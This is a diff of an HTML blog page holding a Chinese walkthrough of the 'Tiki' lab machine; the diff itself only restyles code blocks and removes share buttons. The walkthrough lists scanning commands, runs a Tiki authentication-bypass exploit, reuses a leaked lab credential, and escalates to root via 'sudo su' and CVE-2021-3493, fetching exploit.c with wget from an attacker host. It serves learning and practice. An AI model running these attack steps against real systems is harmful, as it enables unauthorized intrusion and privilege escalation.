@@ -116,30 +116,12 @@
         <li><a class="icon" aria-label="下一篇" href="/2022/05/15/%E7%90%86%E8%A7%A3Linux%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6(File%20Descriptor)/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">上一篇</span>
       <span id="i-next" class="info" style="display:none;">下一篇</span>
       <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/05/15/Tiki%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/05/15/Tiki%20Writeup/&text=Tiki Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/05/15/Tiki%20Writeup/&title=Tiki Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/05/15/Tiki%20Writeup/&is_video=false&description=Tiki Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Tiki Writeup&body=Check out this article: https://hdfzzf.github.io/2022/05/15/Tiki%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/05/15/Tiki%20Writeup/&title=Tiki Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/05/15/Tiki%20Writeup/&title=Tiki Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/05/15/Tiki%20Writeup/&title=Tiki Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/05/15/Tiki%20Writeup/&title=Tiki Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/05/15/Tiki%20Writeup/&name=Tiki Writeup&description=&lt;p&gt;该靶机比较简单。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/05/15/Tiki%20Writeup/&t=Tiki Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
     <div id="toc">
       <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">2. 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 端口信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E4%BF%A1%E6%81%AF"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 网页信息</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#get-shell"><span class="toc-number">3.</span> <span class="toc-text">3. get shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.</span> <span class="toc-text">4. 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%951"><span class="toc-number">4.1.</span> <span class="toc-text">4.1. 方法1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%952"><span class="toc-number">4.2.</span> <span class="toc-text">4.2. 方法2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">5. 总结</span></a></li></ol>
     </div>
@@ -166,8 +148,6 @@
     <div class="postdate">
       
         <time datetime="2022-05-14T16:00:00.000Z" itemprop="datePublished">2022-05-15</time>
-        
-        (Updated: <time datetime="2022-05-15T11:06:28.975Z" itemprop="dateModified">2022-05-15</time>)
         
       
     </div>
@@ -210,9 +190,7 @@
 </ul>
 <h1 id="信息收集">2. 信息收集</h1>
 <h2 id="端口信息">2.1. 端口信息</h2>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">1</span>. <span class="token function">sudo</span> arp-scan -l
-<span class="token number">2</span>. <span class="token function">sudo</span> nmap -p- <span class="token number">10.0</span>.2.48
-<span class="token number">3</span>. <span class="token function">sudo</span> nmap -p22,80,139,445 -A <span class="token number">10.0</span>.2.48<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. sudo arp-scan -l</span><br><span class="line">2. sudo nmap -p- 10.0.2.48</span><br><span class="line">3. sudo nmap -p22,80,139,445 -A 10.0.2.48</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515162646.png" /></p>
 <h2 id="网页信息">2.2. 网页信息</h2>
 <p>首先根据扫描结果，存在robots.txt，里面有一个新的目录 /tiki，然后再次访问该目录，发现来到了一个页面</p>
@@ -223,7 +201,7 @@
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515183448.png" /></p>
 <p>正好有一个身份认证绕过的漏洞</p>
 <h1 id="get-shell">3. get shell</h1>
-<p>直接使用该漏洞，只需要指定ip即可 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python3 <span class="token number">48927</span>.py <span class="token number">10.0</span>.2.48<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>直接使用该漏洞，只需要指定ip即可 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 48927.py 10.0.2.48</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515183538.png" /></p>
 <p>根据结果，admin的密码已经被溢出，接下我们使用空密码就可以登录。但是，页面不允许直接使用空密码登录</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515183631.png" /></p>
@@ -235,48 +213,26 @@
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515184846.png" /></p>
 <p>又继续收集信息，在 Wiki -&gt; List Pages 发现了一个</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515184920.png" /></p>
-<p>红框文件里面的内容像是认证信息： <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">silky:Agy8Y7SPJNXQzqA<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>红框文件里面的内容像是认证信息： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">silky:Agy8Y7SPJNXQzqA</span><br></pre></td></tr></table></figure></p>
 <p>想到端口信息扫描的时候发现开放了22 ssh，尝试登录，成功！</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515185031.png" /></p>
-<p>保险起见，我把另外两个文件也看了，内容为：(第三个文件就是网页的首界面) <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt"># Hi my Name is Silky
-
-This is my third CTF. Dont give up, there is always a way to **root**!
-
-I like Cats, Frogs, Snakes and cute Doggos but thats not helpful isnt it?  
-Hmmm maybe you like something different, ... You like Hacking right?  
-I got a new CVE Number: But I constantly forget its ID :/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>保险起见，我把另外两个文件也看了，内容为：(第三个文件就是网页的首界面) <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Hi my Name is Silky</span><br><span class="line"></span><br><span class="line">This is my third CTF. Dont give up, there is always a way to **root**!</span><br><span class="line"></span><br><span class="line">I like Cats, Frogs, Snakes and cute Doggos but thats not helpful isnt it?  </span><br><span class="line">Hmmm maybe you like something different, ... You like Hacking right?  </span><br><span class="line">I got a new CVE Number: But I constantly forget its ID :/</span><br></pre></td></tr></table></figure></p>
 <p>看这个像是提示，需要使用CVE去提权到root</p>
 <h1 id="权限提升">4. 权限提升</h1>
 <h2 id="方法1">4.1. 方法1</h2>
 <p>超简单，我查看了sudo -l 发现silky用户居然可以以root权限执行所有命令</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515185357.png" /></p>
-<p>那么，接下来直接切换到root即可 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">su</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>那么，接下来直接切换到root即可 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515185426.png" /></p>
 <h2 id="方法2">4.2. 方法2</h2>
 <p>根据提示可能需要使用某个CVE，因此将 linux-exploit-suggester.sh 传入到靶机，但是结果很遗憾，并没有任何可用的CVE</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515185639.png" /></p>
-<p>但是发现靶机的系统是Ubuntu的，而Ubuntu有一个接近万能的CVE，那就是CVE-2021-3493。使用下面的命令查看靶机是否存在gcc <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">which</span> gcc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>但是发现靶机的系统是Ubuntu的，而Ubuntu有一个接近万能的CVE，那就是CVE-2021-3493。使用下面的命令查看靶机是否存在gcc <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">which gcc</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515190025.png" /></p>
-<p>因此，将漏洞利用代码传入到靶机，编译并执行即可提权到root： <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">1</span>. <span class="token function">wget</span> http://10.0.2.4:8090/exploit.c
-<span class="token number">2</span>. gcc exploit.c -o exp
-<span class="token number">3</span>. <span class="token function">chmod</span> +x exp
-<span class="token number">4</span>. ./exp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>因此，将漏洞利用代码传入到靶机，编译并执行即可提权到root： <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. wget http://10.0.2.4:8090/exploit.c</span><br><span class="line">2. gcc exploit.c -o exp</span><br><span class="line">3. chmod +x exp</span><br><span class="line">4. ./exp</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515190138.png" /></p>
 <p>成功提权到root。最后进行收尾工作，读取/root目录下的flag.txt</p>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">
- ██████╗ ██████╗ ███╗   ██╗ ██████╗ ██████╗  █████╗ ████████╗██╗   ██╗██╗      █████╗ ████████╗██╗ ██████╗ ███╗   ██╗███████╗██╗
-██╔════╝██╔═══██╗████╗  ██║██╔════╝ ██╔══██╗██╔══██╗╚══██╔══╝██║   ██║██║     ██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝██║
-██║     ██║   ██║██╔██╗ ██║██║  ███╗██████╔╝███████║   ██║   ██║   ██║██║     ███████║   ██║   ██║██║   ██║██╔██╗ ██║███████╗██║
-██║     ██║   ██║██║╚██╗██║██║   ██║██╔══██╗██╔══██║   ██║   ██║   ██║██║     ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║╚════██║╚═╝
-╚██████╗╚██████╔╝██║ ╚████║╚██████╔╝██║  ██║██║  ██║   ██║   ╚██████╔╝███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║███████║██╗
- ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝
-                                                                                                                                
-You did it ^^
-I hope you had fun.
-Share your flag with me on Twitter: S1lky_1337
-
-
-flag:88d8120f434c3b4221937a8cd0668588<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> ██████╗ ██████╗ ███╗   ██╗ ██████╗ ██████╗  █████╗ ████████╗██╗   ██╗██╗      █████╗ ████████╗██╗ ██████╗ ███╗   ██╗███████╗██╗</span><br><span class="line">██╔════╝██╔═══██╗████╗  ██║██╔════╝ ██╔══██╗██╔══██╗╚══██╔══╝██║   ██║██║     ██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝██║</span><br><span class="line">██║     ██║   ██║██╔██╗ ██║██║  ███╗██████╔╝███████║   ██║   ██║   ██║██║     ███████║   ██║   ██║██║   ██║██╔██╗ ██║███████╗██║</span><br><span class="line">██║     ██║   ██║██║╚██╗██║██║   ██║██╔══██╗██╔══██║   ██║   ██║   ██║██║     ██╔══██║   ██║   ██║██║   ██║██║╚██╗██║╚════██║╚═╝</span><br><span class="line">╚██████╗╚██████╔╝██║ ╚████║╚██████╔╝██║  ██║██║  ██║   ██║   ╚██████╔╝███████╗██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║███████║██╗</span><br><span class="line"> ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝</span><br><span class="line">                                                                                                                                </span><br><span class="line">You did it ^^</span><br><span class="line">I hope you had fun.</span><br><span class="line">Share your flag with me on Twitter: S1lky_1337</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag:88d8120f434c3b4221937a8cd0668588</span><br></pre></td></tr></table></figure>
 <h1 id="总结">5. 总结</h1>
 <p>该靶机较简单，不过有一个坑，那就是tiki的漏洞别乱用网络上的poc，否则会导致靶机页面崩溃，像下面这样</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515190414.png" /></p>
@@ -344,7 +300,6 @@ flag:88d8120f434c3b4221937a8cd0668588<span aria-hidden="true" class="line-number
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
     </div>
 
